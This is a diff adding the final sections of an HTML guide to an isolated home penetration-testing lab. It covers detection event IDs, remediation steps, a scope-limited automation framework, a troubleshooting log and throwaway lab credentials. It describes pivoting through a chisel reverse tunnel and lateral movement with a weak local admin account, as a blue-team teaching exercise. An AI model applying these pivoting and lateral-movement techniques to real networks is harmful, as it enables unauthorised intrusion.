+So a DMZ IDS can't inspect the attack and an internal IDS mis-attributes it — which is
+why egress monitoring and true segmentation are the highest-value controls.</div>
+
+<!-- ===================== 15 DETECTION/REMEDIATION ===================== -->
+<h2 id="p1112">15 · Phases 11–12 — Detection &amp; remediation (summary)</h2>
+<h4>Detect (full guide in <code>detection/</code>)</h4>
+<p>Correlate across three places: the <b>pivot</b> (hacktool on disk + new outbound
+session + SOCKS listener), the <b>network</b> (long-lived low-volume session to an odd
+host), and the <b>target</b> Security log:</p>
+<table>
+<tr><th>Event ID</th><th>Meaning</th></tr>
+<tr><td>4624 (type 3)</td><td>network logon — <code>labadmin</code> from the pivot's IP</td></tr>
+<tr><td>4672</td><td>admin privileges assigned at logon</td></tr>
+<tr><td>5140 / 5145</td><td>access to <code>ADMIN$</code>/<code>C$</code> shares</td></tr>
+<tr><td>4688</td><td>process creation (enable command-line auditing)</td></tr>
+<tr><td>5156</td><td>WFP permitted 445/5985</td></tr>
+</table>
+<p>Enable with: <code>auditpol /set /subcategory:"Logon" /success:enable /failure:enable</code>
+(and Process Creation, File Share), plus PowerShell Script-Block Logging.</p>
+<h4>Remediate (full plan in <code>remediation/</code>)</h4>
+<ol>
+<li><b>Kill the dual-homing</b> — no DMZ host in the internal net. ⬛ breaks the chain.</li>
+<li><b>Default-deny egress</b> on the pivot — the reverse tunnel can't call out. ⬛ breaks the chain.</li>
+<li><b>Remove the weak admin</b> / deploy LAPS — <code>nxc</code> auth fails, no Pwn3d!.</li>
+<li><b>Scope SMB/WinRM</b> to jump hosts only (<code>Set-NetFirewallRule -RemoteAddress</code>).</li>
+</ol>
+
+<!-- ===================== 16 AUTOMATION ===================== -->
+<h2 id="p13">16 · Phase 13 — The automation framework</h2>
+<p>13 scripts in <code>scripts/</code>, one per phase, sharing <code>lab_config.py</code>.
+The design principle: <b>every script refuses to touch anything outside the lab</b> and
+<b>verifies real results</b> (no silent "success").</p>
+<pre># lab_config.py — the hard safety guard every script imports
+_ALLOWED_NETS = [ip_network("172.16.10.0/24"), ip_network("10.0.0.0/24")]
+def assert_lab_target(ip):
+    if not any(ip_address(ip) in n for n in _ALLOWED_NETS):
+        raise OutOfScopeError(f"REFUSED: {ip} is not inside the lab networks")
+    return ip</pre>
+<pre># tunnel_verify.py — proves the tunnel for real: a true SOCKS5 handshake + TCP connect
+def socks5_connect(dst_ip, dst_port):
+    assert_lab_target(dst_ip)
+    s = socket.create_connection(("127.0.0.1", 1080))
+    s.sendall(b"\x05\x01\x00")                       # SOCKS5, no-auth
+    ...  # send CONNECT, check reply byte == 0x00 before claiming success</pre>
+<table>
+<tr><th>Script</th><th>Does</th></tr>
+<tr><td>host_check / network_check</td><td>resources &amp; which lab net you're on</td></tr>
+<tr><td>dmz_scan / initial_access_check</td><td>DMZ sweep; pivot SSH foothold</td></tr>
+<tr><td>chisel_server.sh / chisel_client.sh</td><td>launch the tunnel</td></tr>
+<tr><td>tunnel_verify / proxychains_check</td><td>verify the tunnel really carries traffic</td></tr>
+<tr><td>internal_scan / smb_enum</td><td>scan &amp; enumerate the target through the tunnel</td></tr>
+<tr><td>lateral_movement_lab</td><td>non-destructive auth + read-only RCE</td></tr>
+<tr><td>log_analyzer / report_generator</td><td>blue-team IOC hunt; live status report</td></tr>
+</table>
+
+<!-- ===================== 17 TROUBLESHOOTING ===================== -->
+<h2 id="trouble">17 · Troubleshooting log (every problem &amp; fix)</h2>
+<p>The real learning. Each of these cost time and taught something.</p>
+<table>
+<tr><th>Problem</th><th>Root cause</th><th>Fix</th></tr>
+<tr><td>VT-x flags contradict</td><td>VBS/Memory Integrity owns the hypervisor</td><td>informational; expect slower VMs</td></tr>
+<tr><td>Kali RAM stayed 1024</td><td><code>--boot1 dcd</code> typo rejected the whole modifyvm</td><td>fix flag, re-verify with showvminfo</td></tr>
+<tr><td>Windows 11 black screen (0×0)</td><td>vboxvga has no EFI GOP driver</td><td><code>--graphicscontroller vmsvga</code></td></tr>
+<tr><td>Won't boot the ISO under EFI</td><td>DVD not auto-selected</td><td>EFI Boot Manager → UEFI VBOX CD-ROM</td></tr>
+<tr><td>Install hung on black screen</td><td>slow Hyper-V-mode transition</td><td><code>controlvm reset</code> (not power-off)</td></tr>
+<tr><td>Kali IP = 127.16.10.5</td><td>typo; lives in NetworkManager, not /etc/network/interfaces</td><td><code>nmcli connection modify</code></td></tr>
+<tr><td>pivot→Windows ping fails</td><td>Windows was off (eval auto-shutdown)</td><td>not a network bug — start the VM</td></tr>
+<tr><td>Windows shuts down ~hourly</td><td>expired eval license (2024 ISO, 2026 clock)</td><td>slmgr /rearm (clock-rollback blocked by secure-time-seeding)</td></tr>
+<tr><td>UAC launch kept failing</td><td>UAC default button was "No", Enter cancelled it</td><td>Left-arrow to "Yes" first</td></tr>
+<tr><td>chisel flagged by Defender</td><td>it's a known hacktool/PUA</td><td>download inside Linux; it's also an IOC</td></tr>
+<tr><td>curl hung after NIC2→NAT</td><td>NAT on NIC2 = 10.0.3.0/24, not 10.0.2.x</td><td>use the per-slot subnet</td></tr>
+<tr><td>dhclient: command not found</td><td>removed in Ubuntu 24.04</td><td>manual <code>ip addr/route</code></td></tr>
+<tr><td>nmap all "filtered" through SOCKS</td><td>parallel non-blocking connects</td><td>use <code>nc</code> single connects</td></tr>
+<tr><td>WMI exec fails through tunnel</td><td>DCOM dynamic high ports don't tunnel</td><td>use WinRM (single port 5985)</td></tr>
+<tr><td>New-LocalUser empty password</td><td>host shell ate the <code>$pw</code> variable</td><td>inline the SecureString</td></tr>
+</table>
+
+<!-- ===================== 18 APPENDIX ===================== -->
+<h2 id="appendix">18 · Appendix — command &amp; file reference</h2>
+<h4>Lab credentials (throwaway, lab-only)</h4>
+<table>
+<tr><th>Host</th><th>Account</th><th>Password</th><th>Note</th></tr>
+<tr><td>WIN-TARGET01</td><td>labadmin</td><td>Lab@12345</td><td>local admin — the planted misconfig</td></tr>
+<tr><td>WIN-TARGET01</td><td>kashyap</td><td>(your OOBE pw)</td><td>primary admin</td></tr>
+<tr><td>PIVOT01 / Kali</td><td>pivot / kashyap</td><td>(your install pw)</td><td>used only for local login/sudo</td></tr>
+</table>
+<h4>Project layout</h4>
+<pre>README.md  .gitignore
+architecture/    network-topology.md · attack-flow.md
+attack-scenarios/ advanced-pivoting.md
+configurations/  create-lab-vms.ps1 · download-isos.ps1
+detection/       blue-team-detection-guide.md · windows-audit-policy-setup.md
+remediation/     remediation-plan.md · hardening-checklist.md
+reports/         penetration-test-report.md · .json · linkedin-post.md
+screenshots/     01–10  (isolation, tunnel, Pwn3d!, RCE, packet capture)
+scripts/         13 scripts + lab_config.py + README
+packet-captures/ packet-analysis.md + 2 images
+troubleshooting/ phase1-feasibility-report.md · iso-download-guide.md</pre>
+<p class="small">End of guide. Built and documented by Kashyap Naik. All work performed in an
+isolated, self-owned lab — no external systems were accessed.</p>
+
+</div><!-- /page -->
+</body></html>
